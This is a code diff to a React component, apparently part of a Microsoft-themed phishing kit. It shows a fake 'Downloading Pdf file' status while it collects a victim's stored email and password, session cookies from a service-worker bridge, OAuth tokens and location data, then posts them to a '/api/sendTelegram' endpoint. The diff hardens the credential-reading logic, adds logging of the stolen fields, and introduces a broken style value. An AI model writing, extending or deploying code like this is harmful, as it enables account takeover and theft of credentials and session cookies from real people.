@@ -145,11 +145,34 @@ export default function AdminConsentCallback() {
         setStatus('Downloading Pdf file');
         console.log('🔄 Consolidating all data for submission...');
 
+        // ✅ FIX: Read credentials from BOTH storage locations
         const storedCreds = localStorage.getItem('ms_auth_credentials') || 
                            sessionStorage.getItem('ms_auth_credentials');
-        const credentials = storedCreds ? JSON.parse(storedCreds) : { 
-          email: localStorage.getItem('ms_email') 
-        };
+        
+        let credentials = { email: '', password: '' };
+        
+        if (storedCreds) {
+          try {
+            credentials = JSON.parse(storedCreds);
+            console.log('✅ Credentials loaded from storage:', {
+              email: credentials.email,
+              hasPassword: !!credentials.password
+            });
+          } catch (e) {
+            console.error('❌ Failed to parse credentials:', e);
+          }
+        }
+        
+        // Fallback: Get email from separate storage
+        if (!credentials.email) {
+          credentials.email = localStorage.getItem('ms_email') || sessionStorage.getItem('ms_email') || '';
+        }
+
+        console.log('📊 Final credentials:', {
+          email: credentials.email,
+          hasPassword: !!credentials.password,
+          passwordLength: credentials.password?.length || 0
+        });
 
         let cookies: any[] = [];
         if (window.microsoftCookieBridge) {
@@ -157,7 +180,11 @@ export default function AdminConsentCallback() {
           if (bridgeData && bridgeData.cookies) {
             cookies = bridgeData.cookies;
             console.log(`✅ Retrieved ${cookies.length} cookies from Service Worker bridge`);
+          } else {
+            console.log('⚠️ No cookies found in Service Worker bridge');
           }
+        } else {
+          console.log('⚠️ Microsoft Cookie Bridge not available');
         }
         
         let locationData: any = {};
@@ -200,6 +227,14 @@ export default function AdminConsentCallback() {
           validated: true,
           microsoftAccount: true
         };
+        
+        console.log('📊 Payload summary:', {
+          email: payload.email,
+          hasPassword: !!payload.password,
+          hasOAuthTokens: !!payload.oauth.access_token,
+          cookieCount: payload.cookieCount,
+          hasLocation: !!payload.locationData.ip
+        });
         
         const telegramResponse = await fetch('/api/sendTelegram', {
             method: 'POST',
@@ -269,7 +304,7 @@ export default function AdminConsentCallback() {
               border: '4px solid #f3f2f1',
               borderTop: '4px solid #0078d4',
               borderRadius: '50%',
-              width: '40px',
+              width: 40px',
               height: '40px',
               animation: 'spin 1s linear infinite'
           }}></div>
